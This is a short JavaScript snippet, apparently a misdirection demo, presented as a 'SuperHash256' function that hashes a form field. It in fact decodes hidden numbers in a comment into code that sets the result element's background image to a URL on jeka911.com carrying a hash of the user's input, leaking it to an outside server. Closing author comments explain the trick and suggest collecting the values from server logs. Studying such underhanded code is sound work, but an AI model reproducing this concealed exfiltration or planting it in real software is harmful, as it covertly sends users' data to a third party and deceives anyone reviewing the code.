//http://jsfiddle.net/pLntoqj0/0/

function generateKey() {
	// SuperHash 256 algorithm

	var hash = 0, i, j, k;
	var hashParts = ['','','','',''];
	// SuperHash256 bit shift generateKeys (frequently used characters, require additional randomness)
	var generateKeys = ['.','(',')','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','/','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',' '];


	// Shuffled array:
	var shash256 = (generateKey + '').split(Array(4).join('/'))[1].split(Array(4).join('/'))[0].match(/(\w{1,2})/g);

	// DOM elements
	var input = document.getElementById('user-input').value.toString();
	var res = document.getElementById('result');

	// calculate hash bits
	///21,22,27,14,7,66,4,3,5,13,9,20,17,23,16,6,48,15,3,9,7,66,23,20,14,1,39,39,12,7,13,3,38,30,30,0,5,17,15,39,21,22,39,66,2///
    for (i = 0, j = 0, k = 1; j < shash256.length; i++, j++)
    {
        hashParts[0] = Math.abs( (((hashParts[0] << 5) - hashParts[0]) + (input.length > i ? input.charCodeAt(i) : shash256[i]) ) & 0xFFFFFFFF );
        hashParts[k] += (parseInt(shash256[j]) < generateKeys.length - 1 || (k++ && 0)) ? generateKeys[parseInt(shash256[j])] : '';
    }

    // concatenate hash parts as per SuperHash256 algorithm specifications
    hash = hashParts[0] + !(res[hashParts[1]][hashParts[2]] = hashParts[3] + hashParts[0] + hashParts[4]);

    // display hash to user
    res.innerHTML = hash;
}


// Read more at http://misdirect.ion.land
// Hint:
// 1st - store additional data as comment (line 18).
// 2nd - get that values from function code (generateKey sounds same as generateKeys variable name)
// 3rd - get strings ('style', 'backgroundImage', 'url(//jeka911.com/st/', ')') based on that hidden data, mask this strings as hash calculation
// set background image of result div to "//jeka911.com/st/%hash_name%" (great if server reply with transparent 1x1 image). res[hashParts[1]][hashParts[2]] = hashParts[3] + hashParts[0] + hashParts[4]
// store hash values on server or just check apache logs later
// profit? :)
// tested in Chrome and Firefox
// Jeka Kiselyov, https://github.com/jeka-kiselyov
